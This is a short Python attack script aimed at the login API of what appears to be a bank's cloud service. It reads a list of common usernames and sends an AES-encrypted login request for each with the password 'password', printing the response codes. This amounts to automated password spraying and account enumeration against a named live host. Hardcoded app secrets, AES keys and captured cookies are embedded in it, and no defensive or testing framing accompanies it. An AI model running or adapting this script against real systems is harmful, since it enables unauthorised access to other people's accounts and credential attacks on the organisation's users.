import json
import requests
from MYAES import AESTool


def burp_nbcloud_nbcb_com_cn():
    url = 'https://nbcloud.nbcb.com.cn/api/v3.php/account/login'
    header = {
        "Host": "nbcloud.nbcb.com.cn",
        "Cookie": r"sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2217faa2f123f6b3-0a08fd66c04c6a-576153e-1327104-17faa2f12405f7%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2217faa2f123f6b3-0a08fd66c04c6a-576153e-1327104-17faa2f12405f7%22%7D",
        "Sec-Ch-Ua": '"(Not(A:Brand";v="8", "Chromium";v="98"',
        "S-Ver": '6.0.0:1',
        'S-Aid': 'JsQCsjF3yr7KACyT',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept-Language': 'zh-CN',
        'Accept': 'application/json, text/plain, */*',
        'S-Cid': 'cb39c290-8c77-484c-9547-cfaa178454df',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Origin': 'https://nbcloud.nbcb.com.cn',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://nbcloud.nbcb.com.cn/',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }
    AppId = "JsQCsjF3yr7KACyT"
    AppSecret = "bqGeM4Yrjs3tncJZ"
    AppType = 1
    AppVersion = "6.0.0"
    AppServerKey = "-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQClPk3onKZcsh8H9N6zWMHH6R+her1sS1tUOT8muZh7/CQjarYYVFUDSuFugSpi/NDYb3St3JURw47hXVcz2QwvnJ940bs+Pd7222wZhPcOE3/800/oNJqbCywn2tI/Oc9lkCuCA0JnK8zZhFKM/NVK6lZEARQ/+9jMJ/5Ts1o00QIDAQAB-----END PUBLIC KEY-----"
    HiddenLangIdx = 5
    Verification = "c482c2a48dc7c6c151b975b8e5d1f80d3e995fd0"

    with open('./常用用户名.txt', 'r') as f:
        usernames = f.readlines()
    d_key = {'K': r'sHi2*5SnHQDo7$L$', 'I': r'c2LxpXbS%8EpNM8t'}

    password = "password"
    data = {
        "DevInfo": {
            "Info": {},
            "Name": "Web",
            "Type": 1,
            "Verification": "c482c2a48dc7c6c151b975b8e5d1f80d3e995fd0",
            "AppId": "JsQCsjF3yr7KACyT"
        },
        "U": "username",
        "P": password
    }
    req_data = {
        "Captcha": "11",
        "CC": "",
        "Data":
            'DL7H1hSHLBS21Jw%2BZ5kxgxo2DZFJ2eEKBqvOPrAeM1sRm6iavIAWQtz10STIAholdQkQPCyljkoQHLtjPUAIFjLLplnmVsMZYYx1SFLD71zDC5%2BsBJ1Tf3NT37LzBYUAa%2BGv7YvpH3vejCYLki1LGOFHtqWdtweDiGGVvV4Qt5E%3D',
        "Info": "en_info",
        "RememberMe": "1"
    }
    for username in usernames:
        data["U"] = username
        req_data["Info"] = AESTool(d_key['K'], d_key['I']).aes_encrypt(json.dumps(data))
        res = requests.post(url=url, json=req_data, headers=header)
        print("用户名：{}  \t结果：{}".format(username, res.json()["Code"]))


if __name__ == "__main__":
    burp_nbcloud_nbcb_com_cn()
